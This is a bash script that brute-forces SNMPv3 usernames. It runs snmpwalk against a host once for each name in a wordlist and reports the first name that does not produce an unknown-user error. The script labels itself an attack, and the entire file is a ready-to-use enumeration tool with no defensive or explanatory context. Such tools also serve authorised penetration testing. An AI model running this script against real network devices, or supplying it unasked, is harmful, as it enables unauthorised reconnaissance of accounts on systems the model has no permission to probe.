#!/bin/bash

# 1. phase guess that username

#snmpwalk -v 3 -u admin 192.168.10.1

# snmpwalk: Unknown user name - Error notification

HOST=$1
WORDLIST=$2

if [ $# -eq 0 ]
 then
 echo "Arguments are required: 1. host 2. wordlist of usernames"
 exit 1
fi

# check host
if [[ -z $HOST ]]
 then
 echo "Mandatory 1.arg is HOST"
 exit 1
fi


# Check wordlist
if [[ -z $WORDLIST ]]
 then
 echo "Mandatory 1.arg is wordlist of usernames"
 exit 1
fi

if [ ! -f $WORDLIST ]
 then
 echo "No such file or directory:$WORDLIST"
 exit 1
fi

echo "Trying to attack SNMPv3 on:$HOST:$WORDLIST"

for user in `cat $WORDLIST`
 do 
 snmpwalk -L n -v 3 -u $user $HOST 2>&1 >/dev/null

 if [[ $? -eq 1 ]]
  then
   echo "Invalid username:$user"
  else
   echo "Valid username found:$user:host:$HOST"
   exit 0
  exit 0
 fi

done

exit 0

